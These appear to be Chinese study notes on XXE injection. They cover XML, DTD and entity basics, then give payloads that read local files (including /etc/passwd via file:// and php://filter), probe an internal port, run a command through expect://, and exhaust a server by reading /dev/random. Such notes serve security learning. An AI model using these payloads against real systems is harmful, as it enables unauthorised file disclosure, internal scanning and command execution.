# XXE漏洞

XML External Entity Injection

XML 外部实体注入



## XML基础知识

eXtensible Markup Language

可拓展标记语言



配置文件

交换数据



```xml
<?xml version="1.0" encoding="UTF-8"?> 
<TranInfo>
	<CdtrInf>
    	<Id>34123412344</Id>
    </CdtrInf>
    <Nm>zhangsan</Nm>
    <DbtrInf>
    	<Id>23542353</Id>
        <Nm>lisi</Nm>
    </DbtrInf>
    <Amt>1000</Amt>
</TranInfo>
```

XML必须有根元素，必须关闭标签，大小写敏感，正式嵌套，属性必须加引号



DTD Document Type Definition

文档类型定义 ELEMENT元素



```dtd
<!DOCTYPE TranInfo[
    <!ELEMENT TranInfo(CdtrInf,DbtrInf,Amt)>
    <!ELEMENT CdtrInf(Id,Nm)>
    <!ELEMENT DbtrInf(Id,Nm)>   
    ]>
```



内部ENTITY实体

```dtd
<?xml version="1.0" encoding="UTF-8"?>
<?DOCTYPE name[
<!ELEMENT name ANY>
<!ENTITY cs "changsha">]>

<people>
<name>wuya</name>
<area>&cs;</area>
</people>
```

使用&进行变量使用



外部实体,目前大多数浏览器都已经ban了这种引用方式了

```xml
<?xml version="1.0" encoding="UTF-8"?>
<?DOCTYPE name[
<!ELEMENT name ANY>
<!ENTITY xxe SYSTEM "file:///D:/test/test.dtd">]>

<people>
<name>wuya</name>
<area>&xxe;</area>
</people>
```



外部实体引用协议

Libxml2支持的引用协议

| 协议 | 使用方式                                                   |
| ---- | ---------------------------------------------------------- |
| file | file:///etc/passwd                                         |
| php  | php://filter/read=convert.base64-encode/resource=index.php |
| http | http//:wuya.com/evil.dtd                                   |







## XXE

XML External Entity Injection

XML 外部实体注入



直接输入框里面直接输入

```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE note[<!ENTITY xxe  "nibeiruqinle">]>
<name>&xxe;</name>
```



```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE note[<!ENTITY xxe SYSTEM "file:///E://in.txt">]>
<login>&xxe;</login>
```



```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE note[<!ENTITY xxe SYSTEM "http://127.0.0.1:3306">]>
<login>&xxe;</login>
```



需要服务器安装expect插件才可以运行：

```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE xxe[
<!ELEMENT name ANY>
<!ENTITY xxe SYSTEM "expect://ipconfig">]>
<root>
<name>&xxe;</name>
</root>
```



XXE炸弹，请求随机文件

```xml
<!ENTITY bomb "file:///dev/random">]> <msg>&bomb;</msg>
```

